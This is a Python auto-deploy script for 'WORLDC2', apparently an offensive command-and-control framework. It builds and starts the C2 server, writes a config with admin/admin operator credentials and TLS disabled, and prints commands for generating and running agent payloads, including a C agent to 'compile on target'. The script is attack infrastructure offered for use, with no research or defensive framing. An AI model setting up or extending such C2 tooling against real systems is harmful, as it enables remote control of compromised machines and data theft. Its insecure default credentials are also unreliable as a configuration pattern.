#!/usr/bin/env python3
"""
WORLDC2 C2 — Auto-Deploy Script
Detecta IP local, configura y arranca el servidor C2 automáticamente.

Uso:
    python3 deploy.py              # Despliegue completo
    python3 deploy.py --port 443   # Puerto personalizado
"""

import os
import sys
import socket
import shutil
import subprocess
import platform
import argparse
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent

# === Colores para terminal ===
GREEN  = "\033[92m"
BLUE   = "\033[94m"
YELLOW = "\033[93m"
RED    = "\033[91m"
CYAN   = "\033[96m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def banner():
    print(f"""{BOLD}{CYAN}
   ╔══════════════════════════════════════════════╗
   ║         {BOLD}WORLDC2 C2 Framework — Auto Deploy                          {RESET}{CYAN}       ║
   ║              {YELLOW}ruby570bocadito{RESET}{CYAN}                 ║
   ╚══════════════════════════════════════════════╝
{RESET}""")

def get_local_ip():
    """Detecta la IP local automáticamente."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        try:
            return socket.gethostbyname(socket.gethostname())
        except OSError as e:
            print(f"{YELLOW}[!] Hostname resolution failed ({e}); using 127.0.0.1{RESET}")
            return "127.0.0.1"

def get_public_ip():
    """Intenta obtener la IP pública."""
    try:
        import urllib.request
        return urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode().strip()
    except Exception as e:
        print(f"{YELLOW}[!] Public IP lookup failed: {e}{RESET}")
        return None

def build_server():
    """Compila el servidor Go."""
    server_dir = PROJECT_ROOT / "src" / "go"
    output = PROJECT_ROOT / "worldc2-server"
    
    if output.exists():
        print(f"{GREEN}[✓]{RESET} Server binary already exists: {output}")
        return output
    
    print(f"{BLUE}[>]{RESET} Building Go server...")
    
    go_bin = shutil.which("go")
    if not go_bin:
        for p in ["/tmp/go/bin/go", "/usr/local/go/bin/go"]:
            if os.path.exists(p):
                go_bin = p
                break
    
    if not go_bin:
        print(f"{YELLOW}[!]{RESET} Go not found — using pre-compiled binary if available")
        for p in [PROJECT_ROOT / "worldc2-server", PROJECT_ROOT / "src" / "go" / "server"]:
            if p.exists():
                return p
        return None
    
    env = {**os.environ, "CGO_ENABLED": "0", "GOOS": platform.system().lower()}
    
    result = subprocess.run(
        [go_bin, "build", "-ldflags=-s -w", "-o", str(output), "./cmd/server/main.go"],
        cwd=str(server_dir), env=env, capture_output=True, text=True
    )
    
    if result.returncode == 0:
        print(f"{GREEN}[✓]{RESET} Server compiled: {output}")
        return output
    else:
        print(f"{RED}[✗]{RESET} Build failed: {result.stderr}")
        return None

def generate_config(local_ip, port, api_port, http_port, ws_port):
    """Genera config.yaml con los parámetros correctos."""
    config = f"""server:
  host: "0.0.0.0"
  port: {port}
  max_sessions: 5000
  heartbeat_interval: 30s
  session_timeout: 300s
  reconnect_max_backoff: 300s

api:
  port: {api_port}

transport:
  http_port: {http_port}
  ws_port: {ws_port}
  dns_port: 0
  dns_domains: []

database:
  driver: "sqlite"
  dsn: "worldc2.db"

tls:
  enabled: false
  auto_cert: true
  cert_file: ""
  key_file: ""
  min_version: "1.3"

logging:
  level: "info"
  output: "stdout"
  file: ""

operators:
  - username: "admin"
    password: "admin"
    role: "admin"
"""
    config_path = PROJECT_ROOT / "config.yaml"
    with open(config_path, "w") as f:
        f.write(config)
    return config_path

def generate_payload_info(local_ip, port, api_port):
    """Muestra info para generar payloads."""
    return f"""
{BOLD}{CYAN}╔══════════════════════════════════════════════════════╗
║           PAYLOAD GENERATION COMMANDS              ║
╚══════════════════════════════════════════════════════╝{RESET}

{GREEN}Dashboard:{RESET}  http://{local_ip}:{api_port}
{GREEN}Login:{RESET}     admin / admin

{GREEN}Go Agent (cross-platform):{RESET}
  ./worldc2-agent {local_ip}:{port}

{YELLOW}Generate all payloads:{RESET}
  python3 scripts/payload.py --os all --server {local_ip}:{port}

{BLUE}Python (legacy modules):{RESET}
  python3 agent/py/bridge.py --server {local_ip}:{port}

{RED}C Agent (compile on target):{RESET}
  gcc -O2 -s -o agent agent/c/agent.c && ./agent {local_ip} {port}
"""

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="WORLDC2 C2 Auto-Deploy")
    parser.add_argument("--port", type=int, default=8443, help="C2 listener port")
    parser.add_argument("--api-port", type=int, default=9090, help="API + Dashboard port")
    parser.add_argument("--http-port", type=int, default=8445, help="HTTP long-poll port")
    parser.add_argument("--ws-port", type=int, default=8446, help="WebSocket port")
    parser.add_argument("--no-build", action="store_true", help="Skip Go build")
    args = parser.parse_args()
    
    local_ip = get_local_ip()
    public_ip = get_public_ip()
    
    print(f"{BOLD}Network:{RESET}")
    print(f"  Local IP:   {GREEN}{local_ip}{RESET}")
    if public_ip:
        print(f"  Public IP:  {CYAN}{public_ip}{RESET}")
    print(f"  Hostname:   {socket.gethostname()}")
    print(f"  Platform:   {platform.system()} {platform.machine()}")
    print()
    
    # Generate config
    config_path = generate_config(local_ip, args.port, args.api_port, args.http_port, args.ws_port)
    print(f"{GREEN}[✓]{RESET} Config generated: {config_path}")
    
    # Build server
    server_bin = None
    if not args.no_build:
        server_bin = build_server()
    else:
        for p in [PROJECT_ROOT / "worldc2-server", PROJECT_ROOT / "src" / "go" / "server"]:
            if p.exists():
                server_bin = p
                break
    
    if not server_bin:
        print(f"{RED}[✗]{RESET} No server binary found. Run without --no-build or compile manually.")
        sys.exit(1)
    
    # Show payload info
    print(generate_payload_info(local_ip, args.port, args.api_port))
    
    # Start server
    print(f"{BOLD}{GREEN}[>] Starting WORLDC2 C2 Server...{RESET}")
    print(f"    C2 Listener:  {local_ip}:{args.port}")
    print(f"    Dashboard:    {GREEN}http://{local_ip}:{args.api_port}{RESET}")
    print(f"    Login:        {YELLOW}admin / admin{RESET}")
    print(f"    {RED}Press Ctrl+C to stop{RESET}")
    print()
    
    # Build command — use absolute path
    server_bin_abs = str(Path(server_bin).resolve())
    cmd = [server_bin_abs, "--config", str(PROJECT_ROOT / "config.yaml"), "--no-tls"]
    if args.api_port != 9090:
        cmd.extend(["--api-port", str(args.api_port)])
    
    try:
        project_root = Path(__file__).resolve().parent.parent
        process = subprocess.Popen(cmd, cwd=str(project_root))
        process.wait()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Shutting down...{RESET}")
        process.terminate()
        process.wait()

if __name__ == "__main__":
    main()
